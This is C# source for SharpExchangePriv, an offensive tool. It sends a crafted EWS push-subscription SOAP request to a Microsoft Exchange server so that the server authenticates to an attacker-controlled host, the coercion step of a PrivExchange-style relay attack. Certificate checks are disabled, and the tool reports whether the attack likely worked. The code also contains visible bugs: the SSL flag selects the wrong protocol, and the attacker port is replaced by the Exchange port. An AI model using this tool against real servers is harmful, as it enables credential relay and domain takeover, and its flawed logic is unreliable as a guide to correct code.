using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using CommandLine;
using System.Xml;
using System.Net;
using System.IO;


namespace SharpExchangePriv
{
    class Program
    {
        public static void PrintLogo()
        {
            Console.WriteLine("\n");
            Console.WriteLine(" /$$$$$$$           /$$            /$$$$$$$$                     /$$                                              ");
            Console.WriteLine("| $$__  $$         |__/           | $$_____/                    | $$                                              ");
            Console.WriteLine("| $$  \\ $$ /$$$$$$  /$$ /$$    /$$| $$       /$$   /$$  /$$$$$$$| $$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$ ");
            Console.WriteLine("| $$$$$$$//$$__  $$| $$|  $$  /$$/| $$$$$   |  $$ /$$/ /$$_____/| $$__  $$ |____  $$| $$__  $$ /$$__  $$ /$$__  $$");
            Console.WriteLine("| $$____ /| $$  \\__ /| $$ \\  $$/$$/ | $$__ /    \\  $$$$/ | $$      | $$  \\ $$  /$$$$$$$| $$  \\ $$| $$  \\ $$| $$$$$$$$");
            Console.WriteLine("| $$     | $$      | $$  \\  $$$/  | $$        >$$  $$ | $$      | $$  | $$ /$$__  $$| $$  | $$| $$  | $$| $$_____ / ");
            Console.WriteLine("| $$     | $$      | $$   \\  $/   | $$$$$$$$ /$$/\\  $$|  $$$$$$$| $$  | $$|  $$$$$$$| $$  | $$|  $$$$$$$|  $$$$$$$");
            Console.WriteLine("|__/     |__/      |__/    \\_/    |________/|__/  \\__/ \\_______/|__/  |__/ \\_______/|__/  |__/ \\____  $$ \\_______/");
            Console.WriteLine("                                                                                               /$$  \\ $$          ");          
            Console.WriteLine("                                                                                              |  $$$$$$/          ");
            Console.WriteLine("                                                                                               \\______ /");
            Console.WriteLine("                                                                                                           @den_n1s\n");
        }

        public static void PrintHelp()
        {
            string HelpText = "\nUsage: SharpExchangePriv.exe <options>:\n" +
                "\nOptions:\n" +
                "\n-t, --targetHost\n" +
                "\tSet the IP of the target host, is mandatory\n" +
                "\n" +
                "-a, --attackerHost\n" +
                "\tSet the attacker's IP, is mandatory\n" +
                "\n" +
                "-p, --attackerPort\n" +
                "\tSet the attacker's port\n" +
                "\n" +
                "-g, --attackerPage\n" +
                "\tSet the attacker's page\n" +
                "\n" +
                "-s, --ssl\n" +
                "\tEnable SSL\n" +
                "\n" +
                "-v, --exchangeVersion\n" +
                "\tSet Exchange version, default is 2016\n" +
                "\n" +
                "-e, --exchangePort\n" +
                "\tSet Exchange target port\n" +
                "\n";
                Console.WriteLine(HelpText);
        }

        public static void SharpExchangePriv(string targetHost, string attackerHost, string attackerPort, string attackerPage, bool SSL, string exchangeVersion, string exchangePort)
        {
            string ExchangeVersion = exchangeVersion;
            string ExchangePort = exchangePort;

            //building out exchange server target URL
            string URL = "";
            if (SSL)
            {
                URL = "http://" + targetHost + ":" + ExchangePort + "/EWS/Exchange.asmx";
            }
            else
            {
                URL = "https://" + targetHost + ":" + ExchangePort + "/EWS/Exchange.asmx";
            }
            
            Console.WriteLine("The target URL is {0}\n", URL);

            string AttackerURL = "http://" + attackerHost + ":" + attackerPort + "/" + attackerPage;
 
            
            XmlDocument soapEnvelopeXml = new XmlDocument();

            string soapRequestXML = @"<?xml version=""1.0"" encoding=""utf-8""?>
            <soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:t = ""http://schemas.microsoft.com/exchange/services/2006/types"" xmlns:m =""http://schemas.microsoft.com/exchange/services/2006/messages"">
            <soap:Header><t:RequestServerVersion Version=""Exchange9999"" /></soap:Header >
            <soap:Body ><m:Subscribe><m:PushSubscriptionRequest SubscribeToAllFolders = ""true"">
                <t:EventTypes><t:EventType> NewMailEvent </t:EventType><t:EventType> ModifiedEvent </t:EventType><t:EventType> MovedEvent </t:EventType></t:EventTypes>
                <t:StatusFrequency> 1 </t:StatusFrequency ><t:URL>  URLHere  </t:URL></m:PushSubscriptionRequest></m:Subscribe>
            </soap:Body>
            </soap:Envelope> ";

            soapRequestXML = soapRequestXML.Replace("URLHere", AttackerURL);
            soapRequestXML = soapRequestXML.Replace("9999", ExchangeVersion);

            soapEnvelopeXml.LoadXml(soapRequestXML);

            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(URL);
            request.ContentType = "text/xml;charset=\"utf-8\"";
            request.Method = "POST";
            request.UseDefaultCredentials = true;
            
            //send request to exchange server
            try
            {
                Console.WriteLine("Sent request to exchange server: {0}\n", URL);
                Stream newStream = request.GetRequestStream();
                soapEnvelopeXml.Save(newStream);
                newStream.Close();                
            }
            catch (System.Net.WebException)
            {
                Console.WriteLine("Error request unsuccessful\n");
            }

            //receive response from exchange server
            try
            {
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                StreamReader rd = new StreamReader(response.GetResponseStream());
                string xmlResult = rd.ReadToEnd();
                //Console.WriteLine("The status code is: {0}", response.StatusCode);
                if (response.StatusCode == HttpStatusCode.OK)
                {
                    if (xmlResult.Contains("NoError"))
                    {
                        Console.WriteLine("HTTP 200 response received, the target Exchange server should be authenticating shortly.\n");
                    }
                    else if (xmlResult.Contains("ErrorMissingEmailAddress"))
                    {
                        Console.WriteLine("Error: User does not have an email address associated with their account.\n");
                    }
                    else
                    {
                        Console.WriteLine("An error has occured, attack was likely unsuccessful.\n");
                    }
                }
                else
                {
                    Console.WriteLine("Invalid / no response received, but a web exception did not occur. Attack may not have worked\n");
                }
                response.Close();
            }
            catch (WebException ex)
            {
                Console.WriteLine("Error request unsuccessful\n");
                Console.WriteLine(ex.Message);
            }

    }

        public class Options
        {
            [Option("t", "targetHost", Required = true, HelpText = "Set the target host.")]
            public string targetHost { get; set; }

            [Option("a", "attackerHost", Required = true, HelpText = "Set the attacker host.")]
            public string AttackerHost { get; set; }

            [Option("p", "attackerPort", Required = false, HelpText = "Set the attacker port.")]
            public string AttackerPort { get; set; }

            [Option("g", "attackerPage", Required = false, HelpText = "Set the attacker page.")]
            public string AttackerPage { get; set; }

            [Option("s", "ssl", Required = false, HelpText = "Enable ssl")]
            public bool SSL { get; set; }

            [Option("v", "exchangeVersion", Required = false, HelpText = "Set Exchange version, default is 2016")]
            public string ExchangeVersion { get; set; }

            [Option("e", "exchangePort", Required = false, HelpText = "Set Exchange target port")]
            public string ExchangePort { get; set; }
        }

        static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
                //PrintHelp();
            }
            PrintLogo();

            var Options = new Options();

            bool SSL = true;
            string ExchangeVersion = "2016";
            string ExchangePort = "443";
            string AttackerPort = "80";
            string AttackerPage = "powerPriv";

            if (CommandLineParser.Default.ParseArguments(args, Options))
            {
                if (!string.IsNullOrEmpty(Options.targetHost) || !string.IsNullOrEmpty(Options.AttackerHost))
                {
                    if (!Options.SSL)
                    {
                        SSL = false;
                    }
                    if (!string.IsNullOrEmpty(Options.ExchangeVersion))
                    {
                        ExchangeVersion = Options.ExchangeVersion;
                    }
                    if (!string.IsNullOrEmpty(Options.ExchangePort))
                    {
                        ExchangePort = Options.ExchangePort;
                    }
                    if (!string.IsNullOrEmpty(Options.AttackerPort))
                    {
                        AttackerPort = Options.ExchangePort;
                    }
                    if (!string.IsNullOrEmpty(Options.AttackerPage))
                    {
                        AttackerPage = Options.AttackerPage;
                    }
                    SharpExchangePriv(Options.targetHost, Options.AttackerHost, AttackerPort, AttackerPage, SSL, ExchangeVersion, ExchangePort);
                }
                else
                {
                    PrintHelp();
                }
            }
            else
            {
                PrintHelp();
            }
        }
    }
}
